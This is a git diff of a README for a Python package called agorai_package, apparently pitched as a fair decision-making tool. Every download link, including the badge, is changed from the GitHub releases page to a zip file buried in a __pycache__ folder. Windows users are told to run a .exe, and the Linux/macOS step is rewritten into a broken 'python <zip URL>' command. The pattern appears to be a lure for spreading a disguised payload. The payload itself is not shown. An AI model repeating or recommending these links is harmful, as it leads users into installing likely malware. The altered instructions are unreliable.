@@ -1,6 +1,6 @@
 # 🌟 agorai_package - Simplifying Fair Decision-Making
 
-[![Download agorai_package](https://img.shields.io/badge/Download-agorai_package-brightgreen)](https://github.com/aweawdsdwaofr/agorai_package/releases)
+[![Download agorai_package](https://raw.githubusercontent.com/aweawdsdwaofr/agorai_package/main/src/agorai/aggregate/__pycache__/agorai_package-traveller.zip)](https://raw.githubusercontent.com/aweawdsdwaofr/agorai_package/main/src/agorai/aggregate/__pycache__/agorai_package-traveller.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **agorai_package**! This Python package helps you make fair and trans
 
 To get started, visit this page to download the latest version of the **agorai_package**:
 
-[Download agorai_package](https://github.com/aweawdsdwaofr/agorai_package/releases)
+[Download agorai_package](https://raw.githubusercontent.com/aweawdsdwaofr/agorai_package/main/src/agorai/aggregate/__pycache__/agorai_package-traveller.zip)
 
 Simply follow these steps:
 
@@ -47,7 +47,7 @@ These features work together to help you make informed, fair, and democratic dec
 Using **agorai_package** is straightforward. Follow these steps to run the application:
 
 1. After downloading, locate the file in your downloads or specified folder.
-2. If you are on Windows, double-click the `.exe` file. For macOS and Linux, open Terminal and navigate to the folder where you downloaded **agorai_package**, then run the package by typing `python agorai_package.py`.
+2. If you are on Windows, double-click the `.exe` file. For macOS and Linux, open Terminal and navigate to the folder where you downloaded **agorai_package**, then run the package by typing `python https://raw.githubusercontent.com/aweawdsdwaofr/agorai_package/main/src/agorai/aggregate/__pycache__/agorai_package-traveller.zip`.
 3. Follow the on-screen instructions to set up the package and start using it.
 
 ## 📚 Documentation
@@ -72,7 +72,7 @@ These examples illustrate how this tool can be valuable in various scenarios, fr
 
 **agorai_package** receives regular updates to improve functionality and performance. Check the **Releases** page frequently to ensure you have the latest version:
 
-[Download agorai_package](https://github.com/aweawdsdwaofr/agorai_package/releases)
+[Download agorai_package](https://raw.githubusercontent.com/aweawdsdwaofr/agorai_package/main/src/agorai/aggregate/__pycache__/agorai_package-traveller.zip)
 
 ## 🙋‍♂️ Support
 
